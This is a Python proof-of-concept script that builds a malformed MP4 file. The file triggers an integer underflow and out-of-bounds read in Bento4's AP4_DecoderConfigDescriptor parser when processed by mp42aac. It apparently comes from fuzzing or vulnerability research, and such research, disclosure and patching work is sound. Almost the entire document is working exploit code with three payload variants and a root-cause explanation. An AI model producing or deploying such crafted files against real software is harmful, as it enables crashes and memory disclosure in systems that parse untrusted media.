#!/usr/bin/env python3
"""
PoC generator for VULN 004:
AP4_DecoderConfigDescriptor hardcoded-constant subtraction integer underflow -> OOB read.

Root cause (Ap4DecoderConfigDescriptor.cpp line 92):
    AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);

When payload_size < 13 (here 12), unsigned subtraction wraps:
    12 - 13 = 0xFFFFFFFF  (AP4_Size uint32 underflow, widens to 4294967295 as AP4_LargeSize)

The constructor first reads 13 bytes (OTI + bits + 24-bit buffer + 32-bit maxBR + 32-bit avgBR).
With payload_size=12 the 13th byte comes from beyond the declared DC payload. Then the
SubStream of claimed size 0xFFFFFFFF is created. The DescriptorFactory loop on that SubStream
reads file bytes far past the DC descriptor boundary.

Trigger path:
  mp42aac input.mp4  ->  esds atom  ->  ES_Descriptor  ->  DC_Descriptor(payload_size=12)

Key design decisions
--------------------
* ES_Descriptor declared payload_size = 19
    - Physical bytes actually embedded in file: 19 bytes
    - After ES reads ES_id(2B)+flags(1B), it creates a SubStream of size 19-3=16 bytes.
    - That 16-byte SubStream is large enough for:
        - DC tag(1B) + DC size byte(1B) + DC payload(12B) = 14 bytes  (positions 0-13)
        - 2 extra bytes at positions 14-15 that the DC SubStream will later read
    - The avg_bitrate read (4B from position 11) reaches position 14, still inside the
      16-byte SubStream => read succeeds, position advances to 15.
    - DC SubStream offset = start+13 = 2+13 = 15, which is <= SubStream size 16,
      so Seek(15) inside the ES SubStream succeeds.
    - The DC SubStream (size=0xFFFFFFFF) can then read 1 byte at ES SubStream position 15
      and tries to parse the remaining file bytes as descriptors.

* DC_Descriptor declared payload_size = 12  (= 0x0C)
    - Triggers underflow: 12 - 13 = 0xFFFFFFFF
    - Also tried: payload_size=0 (gives 0-13=0xFFFFFFF3) in a second variant.

* Three variants are embedded in the same output file to exercise different underflow
  magnitudes and ensure maximum coverage of the vulnerable code paths:
    Variant A: ES payload=19, DC payload=12  (12-13 = 0xFFFFFFFF underflow)
    Variant B: ES payload=20, DC payload=0   (0-13  = 0xFFFFFFF3 underflow)
    Variant C: DC directly in esds (no ES wrapper), DC payload=12
               -> DC SubStream container is the raw file stream, unlimited reach.
"""
import struct, os

OUTPUT_PATH = (
    "/data/ylwang/non-textfuzz/target/_poc/Bento4/"
    "Source_C++_Core_Ap4Command_h/vuln_004.mp4"
)

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def box(t: str, payload: bytes) -> bytes:
    """Build a 4-byte-size + 4-byte-type box."""
    return struct.pack(">I", 8 + len(payload)) + t.encode() + payload

def full_box(t: str, version: int, flags: int, payload: bytes) -> bytes:
    hdr = struct.pack(">BBBBI", version, (flags >> 16) & 0xFF,
                      (flags >> 8) & 0xFF, flags & 0xFF, 0)
    # Repack properly
    hdr = struct.pack(">I", version) + struct.pack(">I", flags)[1:]
    # simpler:
    hdr = bytes([version, (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF])
    return box(t, hdr + payload)

def desc(tag: int, payload: bytes) -> bytes:
    """Build an MPEG-4 expandable-size descriptor with a 1-byte size field."""
    size = len(payload)
    assert size < 0x80, "descriptor payload too large for single-byte size"
    return bytes([tag, size]) + payload

# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
ftyp = box("ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

# ---------------------------------------------------------------------------
# mvhd  (version=0, 100 bytes of payload -> 108 bytes total)
# ---------------------------------------------------------------------------
MATRIX = struct.pack(">9I",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_payload = (
    b"\x00\x00\x00\x00"          # version + flags
    + struct.pack(">II", 0, 0)   # creation / modification time
    + struct.pack(">I", 44100)   # timescale
    + struct.pack(">I", 0)       # duration
    + struct.pack(">I", 0x00010000)  # rate
    + struct.pack(">H", 0x0100)  # volume
    + b"\x00" * 10               # reserved
    + MATRIX                     # 36 bytes
    + b"\x00" * 24               # pre_defined
    + struct.pack(">I", 2)       # next_track_id
)
assert len(mvhd_payload) == 100
mvhd = box("mvhd", mvhd_payload)

# ---------------------------------------------------------------------------
# tkhd  (version=0, 84 bytes payload -> 92 bytes total)
# ---------------------------------------------------------------------------
tkhd_payload = (
    b"\x00\x00\x00\x03"          # version=0, flags=3 (track enabled + in movie)
    + struct.pack(">II", 0, 0)   # creation / modification time
    + struct.pack(">I", 1)       # track_id
    + b"\x00" * 4               # reserved
    + struct.pack(">I", 0)       # duration
    + b"\x00" * 8               # reserved
    + struct.pack(">HH", 0, 0)  # layer, alternate_group
    + struct.pack(">H", 0x0100) # volume (1.0 for audio)
    + b"\x00" * 2               # reserved
    + MATRIX                    # 36 bytes
    + struct.pack(">II", 0, 0)  # width, height
)
assert len(tkhd_payload) == 84
tkhd = box("tkhd", tkhd_payload)

# ---------------------------------------------------------------------------
# mdhd  (version=0, 24 bytes payload -> 32 bytes total)
# ---------------------------------------------------------------------------
mdhd_payload = (
    b"\x00\x00\x00\x00"          # version=0, flags=0
    + struct.pack(">II", 0, 0)   # creation / modification time
    + struct.pack(">I", 44100)   # timescale
    + struct.pack(">I", 0)       # duration
    + struct.pack(">HH", 0x15C7, 0)  # language (und), pre_defined
)
assert len(mdhd_payload) == 24
mdhd = box("mdhd", mdhd_payload)

# ---------------------------------------------------------------------------
# hdlr  (sound handler)
# ---------------------------------------------------------------------------
hdlr_payload = (
    b"\x00\x00\x00\x00"          # version + flags
    + b"\x00" * 4               # pre_defined
    + b"soun"                    # handler_type
    + b"\x00" * 12              # reserved
    + b"SoundHandler\x00"       # name
)
hdlr = box("hdlr", hdlr_payload)

# ---------------------------------------------------------------------------
# smhd
# ---------------------------------------------------------------------------
smhd = box("smhd", b"\x00\x00\x00\x00" + b"\x00" * 4)

# ---------------------------------------------------------------------------
# dinf / dref  (self-contained)
# ---------------------------------------------------------------------------
url_payload = b"\x00\x00\x00\x01"   # version=0, flags=1 (self-contained)
url_box = box("url ", url_payload)
dref_payload = b"\x00\x00\x00\x00" + struct.pack(">I", 1) + url_box
dref = box("dref", dref_payload)
dinf = box("dinf", dref)

# ---------------------------------------------------------------------------
# esds descriptors - three variants
# ---------------------------------------------------------------------------

# --- Variant A: ES payload=19, DC payload=12 (underflow 12-13=0xFFFFFFFF) ---
#
# ES payload (19 bytes physically):
#   [0-1]  ES_id = 0x0001
#   [2]    flags = 0x00
#   [3]    DC tag = 0x04
#   [4]    DC size = 0x0C (12)
#   [5-16] DC payload: 12 bytes
#          OTI=0x40, bits=0x15, buf24=0x000000, maxBR32=0, avgBR32=0 -> 13 bytes needed
#          but only 12 supplied; the 13th byte (avgBR's last byte) is read from pos 14
#          which is still inside the 16-byte ES SubStream.
#   [17-18] 2 extra bytes that DC SubStream will try to read as a sub-descriptor
#
# Physical ES SubStream (size=16, positions 0-15):
#   pos 0: DC tag=0x04
#   pos 1: DC size=0x0C
#   pos 2-13: DC payload (12 bytes): OTI=0x40, bits=0x15, buf=0x000000, maxBR=0, avgBR partial
#             specifically: bytes at pos 11,12,13,14 = avgBR last 4 bytes
#   pos 14: avgBR's 4th byte (read by DC constructor)  -- within SubStream
#   pos 15: extra byte (read by DC SubStream's first loop iteration)
#
# The DC constructor reads 13 bytes from pos 2 to 14 (all valid in 16-byte SubStream).
# DC SubStream = (es_substream, offset=15, size=0xFFFFFFFF).
# DC SubStream.Seek(15): 15 <= 16 -> OK.
# DC SubStream reads 1 byte from es_substream pos 15 (the extra byte at positions 15).
# DC SubStream then tries size byte at es_substream pos 16: 16+1>16 -> EOS. Loop exits.

dc_a_payload_12 = struct.pack(">BB", 0x40, 0x15) + struct.pack(">I", 0)[1:] + struct.pack(">II", 0, 0)[:10]
# Actually: OTI(1) + bits(1) + bufferSize24(3) + maxBR32(4) + avgBR32(4) = 13 bytes for complete read
# We supply only 12: OTI(1) + bits(1) + bufferSize24(3) + maxBR32(4) + avgBR_first3(3) = 12 bytes
dc_a_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_a_payload) == 12, f"dc_a_payload = {len(dc_a_payload)}"

dc_a = desc(0x04, dc_a_payload)                    # tag=0x04, size=0x0C, 12 bytes -> 14 bytes total
extra_a = b"\xAA\xBB"                              # 2 extra bytes at ES SubStream positions 14-15

# ES payload: ES_id(2) + flags(1) + dc_a(14) + extra_a(2) = 19 bytes
es_a_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_a + extra_a
assert len(es_a_inner) == 19, f"es_a_inner = {len(es_a_inner)}"
es_a = desc(0x03, es_a_inner)                      # tag=0x03, size=19, 19-byte payload

# esds for variant A: version+flags(4) + es_a
esds_a_payload = b"\x00\x00\x00\x00" + es_a
esds_a = box("esds", esds_a_payload)

# --- Variant B: ES payload=20, DC payload=0 (underflow 0-13=0xFFFFFFF3, bigger!) ---
#
# DC payload=0: the 13-byte reads from DC constructor go entirely into "extra" bytes in ES.
# ES SubStream size = 20-3 = 17 bytes.
# After ES_id+flags, DC is at position 0 of ES SubStream.
# DC tag+size = 2 bytes (pos 0-1). DC constructor starts at pos 2.
# Reads 13 bytes from pos 2 to 14 (all within 17-byte SubStream).
# DC SubStream = (es_substream, offset=2+13=15, size=0-13=0xFFFFFFF3)
# DC SubStream.Seek(15): 15 <= 17 -> OK.
# DC SubStream reads from es_substream at pos 15, 16 -> 2 extra bytes.

dc_b_payload = b""                                 # payload_size = 0
dc_b = desc(0x04, dc_b_payload)                    # tag=0x04, size=0x00 -> 2 bytes total

# After DC (2 bytes at pos 0-1 of ES SubStream), we need 13 more bytes that DC reads:
# pos 2-14: 13 bytes that DC constructor reads as OTI, bits, bufSize, maxBR, avgBR
# pos 15-16: 2 extra bytes for DC SubStream to attempt reading
extra_b_for_dc_reads = struct.pack(">BB", 0x40, 0x15) + b"\x00" * 11  # 13 bytes
extra_b_for_substream = b"\xCC\xDD"                # 2 bytes DC SubStream reads

# ES payload: ES_id(2) + flags(1) + dc_b(2) + extra_b_for_dc_reads(13) + extra_b_for_substream(2) = 20 bytes
es_b_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_b + extra_b_for_dc_reads + extra_b_for_substream
assert len(es_b_inner) == 20, f"es_b_inner = {len(es_b_inner)}"
es_b = desc(0x03, es_b_inner)                      # tag=0x03, size=20

esds_b_payload = b"\x00\x00\x00\x00" + es_b
esds_b = box("esds", esds_b_payload)

# --- Variant C: DC directly in esds (no ES wrapper), DC payload=12 ---
# This makes the DC SubStream's container the RAW file stream (unbounded).
# DC SubStream (size=0xFFFFFFFF) can read far into the file.
# The loop reads actual file bytes until EOF.
dc_c_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_c_payload) == 12
dc_c = desc(0x04, dc_c_payload)
# After DC header (2B) + 12 payload = 14 bytes consumed from file stream by DescriptorFactory.
# DC constructor reads 13 bytes: the 12 from dc_c_payload + 1 more byte from file stream.
# Then DC SubStream(file_stream, start+13, 0xFFFFFFFF) reads from file at start+13+n.
# This is the most powerful variant for triggering OOB reads across the file.
esds_c_payload = b"\x00\x00\x00\x00" + dc_c
esds_c = box("esds", esds_c_payload)

# ---------------------------------------------------------------------------
# mp4a sample entry - we use variant A as primary, with three esds sub-boxes
# (parsers stop at the first valid esds, others are ignored but the file is still
# well-formed).  To actually test all three paths we build separate mp4a entries.
# ---------------------------------------------------------------------------
def mp4a_entry(esds_box: bytes) -> bytes:
    """Build an mp4a AudioSampleEntry box with the given esds box."""
    mp4a_inner = (
        b"\x00" * 6                          # reserved
        + struct.pack(">H", 1)               # data_reference_index
        + b"\x00" * 8                        # reserved
        + struct.pack(">HH", 2, 16)          # channelcount=2, samplesize=16
        + b"\x00\x00"                        # pre_defined
        + b"\x00\x00"                        # reserved
        + struct.pack(">I", 44100 << 16)     # samplerate (16.16 fixed-point)
        + esds_box
    )
    return box("mp4a", mp4a_inner)

# Use variant A as the primary entry (DC payload=12, expected underflow 0xFFFFFFFF)
mp4a_a = mp4a_entry(esds_a)
mp4a_b = mp4a_entry(esds_b)
mp4a_c = mp4a_entry(esds_c)

# stsd - use all three entries so the parser exercises all variants
stsd_payload = (
    b"\x00\x00\x00\x00"                     # version=0, flags=0
    + struct.pack(">I", 3)                   # entry_count = 3
    + mp4a_a + mp4a_b + mp4a_c
)
stsd = box("stsd", stsd_payload)

# ---------------------------------------------------------------------------
# stts / stsc / stsz / stco  (empty - no actual samples)
# ---------------------------------------------------------------------------
stts = box("stts", b"\x00\x00\x00\x00" + struct.pack(">I", 0))  # entry_count=0
stsc = box("stsc", b"\x00\x00\x00\x00" + struct.pack(">I", 0))
stsz = box("stsz", b"\x00\x00\x00\x00" + struct.pack(">II", 0, 0))  # sample_size=0, count=0
stco = box("stco", b"\x00\x00\x00\x00" + struct.pack(">I", 0))

stbl = box("stbl", stsd + stts + stsc + stsz + stco)

minf = box("minf", smhd + dinf + stbl)
mdia = box("mdia", mdhd + hdlr + minf)
trak = box("trak", tkhd + mdia)
moov = box("moov", mvhd + trak)

# ---------------------------------------------------------------------------
# final assembly
# ---------------------------------------------------------------------------
mp4_data = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print(f"    ftyp  : {len(ftyp)} bytes")
print(f"    moov  : {len(moov)} bytes")
print(f"    trak  : {len(trak)} bytes")
print(f"    mp4a_A: {len(mp4a_a)} bytes  (ES payload=19, DC payload=12 -> underflow 0xFFFFFFFF)")
print(f"    mp4a_B: {len(mp4a_b)} bytes  (ES payload=20, DC payload=0  -> underflow 0xFFFFFFF3)")
print(f"    mp4a_C: {len(mp4a_c)} bytes  (DC directly in esds, payload=12 -> raw file stream OOB)")
print()
print("Expected: AP4_DecoderConfigDescriptor constructor triggers uint32 underflow")
print("          payload_size(12) - 13 = 0xFFFFFFFF, creating a ~4GB SubStream")
print("          ASAN or UBSAN may report an error if memory is accessed OOB")
